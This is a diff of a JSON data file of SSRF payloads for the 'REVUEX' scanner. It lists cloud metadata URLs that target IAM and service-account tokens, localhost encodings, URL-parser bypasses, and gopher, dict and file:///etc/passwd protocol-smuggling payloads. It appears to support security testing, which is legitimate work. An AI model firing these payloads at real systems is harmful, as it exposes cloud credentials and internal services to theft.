@@ -1,160 +1,176 @@
 {
   "metadata": {
-    "name": "SSRF Payloads",
-    "version": "1.0.0",
-    "description": "Comprehensive SSRF payload collection for REVUEX SSRF Scanner",
+    "name": "SSRF Payloads v4.0",
+    "version": "4.0.0",
+    "description": "SSRF testing payloads for REVUEX SSRF Scanner GOLD v4.0",
     "author": "REVUEX Team"
   },
+  "ssrf_parameters": {
+    "description": "Common SSRF-vulnerable parameter names",
+    "high_priority": [
+      "url", "link", "uri", "src", "source", "target", "dest", "destination",
+      "redirect", "redirect_url", "redirect_uri", "return", "return_url",
+      "callback", "callback_url", "next", "next_url"
+    ],
+    "medium_priority": [
+      "path", "file", "document", "page", "load", "fetch", "proxy",
+      "request", "site", "resource", "ref", "reference"
+    ],
+    "low_priority": [
+      "img", "image", "avatar", "icon", "feed", "rss", "xml",
+      "api", "endpoint", "host", "domain", "server"
+    ]
+  },
+  "internal_payloads": {
+    "localhost": [
+      "http://127.0.0.1",
+      "http://localhost",
+      "http://127.0.0.1:80",
+      "http://127.0.0.1:443",
+      "http://127.0.0.1:8080",
+      "http://127.0.0.1:8443",
+      "http://127.0.0.1:3000",
+      "http://127.0.0.1:5000"
+    ],
+    "ipv6": [
+      "http://[::1]",
+      "http://[0:0:0:0:0:0:0:1]",
+      "http://[::ffff:127.0.0.1]"
+    ],
+    "alternative": [
+      "http://0.0.0.0",
+      "http://0",
+      "http://127.1",
+      "http://127.0.1",
+      "http://2130706433",
+      "http://017700000001",
+      "http://0x7f.0.0.1",
+      "http://0x7f000001"
+    ]
+  },
   "cloud_metadata": {
-    "description": "Cloud provider metadata endpoints",
-    "payloads": [
-      {
-        "name": "AWS IMDSv1",
-        "url": "http://169.254.169.254/latest/meta-data/",
-        "provider": "aws",
-        "severity": "critical"
-      },
-      {
-        "name": "AWS IMDSv1 IAM Credentials",
-        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "provider": "aws",
-        "severity": "critical"
-      },
-      {
-        "name": "AWS IMDSv1 User Data",
-        "url": "http://169.254.169.254/latest/user-data/",
-        "provider": "aws",
-        "severity": "high"
-      },
-      {
-        "name": "AWS IMDSv1 Instance Identity",
-        "url": "http://169.254.169.254/latest/dynamic/instance-identity/document",
-        "provider": "aws",
-        "severity": "high"
-      },
-      {
-        "name": "GCP Metadata",
-        "url": "http://metadata.google.internal/computeMetadata/v1/",
-        "headers": {"Metadata-Flavor": "Google"},
-        "provider": "gcp",
-        "severity": "critical"
-      },
-      {
-        "name": "GCP Service Account Token",
-        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-        "headers": {"Metadata-Flavor": "Google"},
-        "provider": "gcp",
-        "severity": "critical"
-      },
-      {
-        "name": "GCP Project Info",
-        "url": "http://metadata.google.internal/computeMetadata/v1/project/",
-        "headers": {"Metadata-Flavor": "Google"},
-        "provider": "gcp",
-        "severity": "high"
-      },
-      {
-        "name": "Azure IMDS",
-        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        "headers": {"Metadata": "true"},
-        "provider": "azure",
-        "severity": "critical"
-      },
-      {
-        "name": "Azure Identity Token",
-        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-        "headers": {"Metadata": "true"},
-        "provider": "azure",
-        "severity": "critical"
-      },
-      {
-        "name": "DigitalOcean Metadata",
-        "url": "http://169.254.169.254/metadata/v1/",
-        "provider": "digitalocean",
-        "severity": "high"
-      },
-      {
-        "name": "Oracle Cloud Metadata",
-        "url": "http://169.254.169.254/opc/v1/instance/",
-        "provider": "oracle",
-        "severity": "high"
-      },
-      {
-        "name": "Alibaba Cloud Metadata",
-        "url": "http://100.100.100.200/latest/meta-data/",
-        "provider": "alibaba",
-        "severity": "high"
-      },
-      {
-        "name": "Kubernetes Service Account",
-        "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets/",
-        "provider": "kubernetes",
-        "severity": "critical"
-      }
+    "aws": {
+      "base": "http://169.254.169.254/latest/",
+      "endpoints": [
+        "meta-data/",
+        "meta-data/ami-id",
+        "meta-data/hostname",
+        "meta-data/iam/security-credentials/",
+        "user-data",
+        "dynamic/instance-identity/document"
+      ]
+    },
+    "gcp": {
+      "base": "http://metadata.google.internal/computeMetadata/v1/",
+      "headers": {"Metadata-Flavor": "Google"},
+      "endpoints": [
+        "project/project-id",
+        "instance/hostname",
+        "instance/service-accounts/default/token"
+      ]
+    },
+    "azure": {
+      "base": "http://169.254.169.254/metadata/",
+      "headers": {"Metadata": "true"},
+      "endpoints": [
+        "instance?api-version=2021-02-01",
+        "identity/oauth2/token"
+      ]
+    },
+    "digital_ocean": {
+      "base": "http://169.254.169.254/metadata/v1/",
+      "endpoints": [
+        "hostname",
+        "user-data",
+        "region"
+      ]
+    }
+  },
+  "bypass_techniques": {
+    "url_parser_confusion": [
+      "http://127.0.0.1#@example.com",
+      "http://example.com@127.0.0.1",
+      "http://127.0.0.1%23@example.com",
+      "http://127.0.0.1%2523@example.com",
+      "http://127.0.0.1:80%23@example.com"
+    ],
+    "unicode_encoding": [
+      "http://127。0。0。1",
+      "http://①②⑦.0.0.1",
+      "http://127．0．0．1"
+    ],
+    "dns_rebinding": [
+      "http://localtest.me",
+      "http://spoofed.burpcollaborator.net",
+      "http://127.0.0.1.nip.io"
+    ],
+    "protocol_smuggling": [
+      "gopher://127.0.0.1:25/",
+      "dict://127.0.0.1:11211/",
+      "file:///etc/passwd"
     ]
   },
-  "internal_networks": {
-    "description": "Internal network scanning payloads",
-    "payloads": [
-      "http://127.0.0.1/",
-      "http://localhost/",
-      "http://0.0.0.0/",
-      "http://[::1]/",
-      "http://127.0.0.1:22/",
-      "http://127.0.0.1:80/",
-      "http://127.0.0.1:443/",
-      "http://127.0.0.1:3306/",
-      "http://127.0.0.1:5432/",
-      "http://127.0.0.1:6379/",
-      "http://127.0.0.1:27017/",
-      "http://127.0.0.1:9200/",
-      "http://127.0.0.1:8080/",
-      "http://127.0.0.1:8443/",
-      "http://10.0.0.1/",
-      "http://172.16.0.1/",
-      "http://192.168.0.1/",
-      "http://192.168.1.1/"
+  "header_injection": {
+    "description": "Headers for blind SSRF testing",
+    "headers": [
+      "X-Forwarded-For",
+      "X-Forwarded-Host",
+      "X-Original-URL",
+      "X-Rewrite-URL",
+      "Referer",
+      "Host",
+      "X-Custom-IP-Authorization",
+      "X-Real-IP"
     ]
   },
-  "url_parser_bypasses": {
-    "description": "URL parser confusion payloads",
-    "payloads": [
-      "http://127.0.0.1@evil.com",
-      "http://evil.com@127.0.0.1",
-      "http://127.0.0.1#@evil.com",
-      "http://127.0.0.1%2523@evil.com",
-      "http://127.0.0.1:80@evil.com",
-      "http://127.1/",
-      "http://0x7f000001/",
-      "http://2130706433/",
-      "http://017700000001/",
-      "http://0177.0.0.1/",
-      "http://127.0.0.1.nip.io/",
-      "http://127.0.0.1.xip.io/",
-      "http://localtest.me/",
-      "http://spoofed.burpcollaborator.net/",
-      "http://[0:0:0:0:0:ffff:127.0.0.1]/",
-      "http://①②⑦.⓪.⓪.①/"
+  "response_indicators": {
+    "positive": [
+      "localhost",
+      "127.0.0.1",
+      "::1",
+      "internal",
+      "private",
+      "metadata",
+      "instance",
+      "ami-id",
+      "hostname"
+    ],
+    "error_based": [
+      "connection refused",
+      "no route to host",
+      "network unreachable",
+      "timeout",
+      "could not resolve"
     ]
   },
-  "protocol_smuggling": {
-    "description": "Protocol smuggling payloads",
-    "payloads": [
-      "file:///etc/passwd",
-      "file:///c:/windows/win.ini",
-      "dict://127.0.0.1:6379/info",
-      "gopher://127.0.0.1:6379/_INFO%0d%0a",
-      "gopher://127.0.0.1:11211/_stats%0d%0a",
-      "ldap://127.0.0.1:389/",
-      "tftp://127.0.0.1/test"
+  "common_endpoints": {
+    "description": "Common SSRF-prone API paths",
+    "paths": [
+      "/api/proxy",
+      "/api/fetch",
+      "/api/url",
+      "/api/request",
+      "/proxy",
+      "/fetch",
+      "/redirect",
+      "/callback",
+      "/load",
+      "/image",
+      "/avatar",
+      "/webhook",
+      "/api/webhook"
     ]
   },
-  "dns_rebinding": {
-    "description": "DNS rebinding test domains",
-    "payloads": [
-      "http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/",
-      "http://make-127.0.0.1-and-169.254.169.254.rbndr.us/",
-      "http://7f000001.c0a80001.rbndr.us/"
-    ]
+  "sie_patterns": {
+    "description": "Patterns for Scope Intelligence Engine",
+    "javascript": {
+      "fetch": "fetch\\s*\\(\\s*['\"`]([^'\"`]+)['\"`]",
+      "axios": "axios\\.(get|post|put|delete|patch)\\s*\\(\\s*['\"`]([^'\"`]+)['\"`]",
+      "xhr": "\\.open\\s*\\(\\s*['\"`](\\w+)['\"`]\\s*,\\s*['\"`]([^'\"`]+)['\"`]"
+    },
+    "html": {
+      "form_action": "<form[^>]*action=['\"]([^'\"]+)['\"]",
+      "href": "href\\s*=\\s*['\"]([^'\"]+)['\"]"
+    }
   }
 }
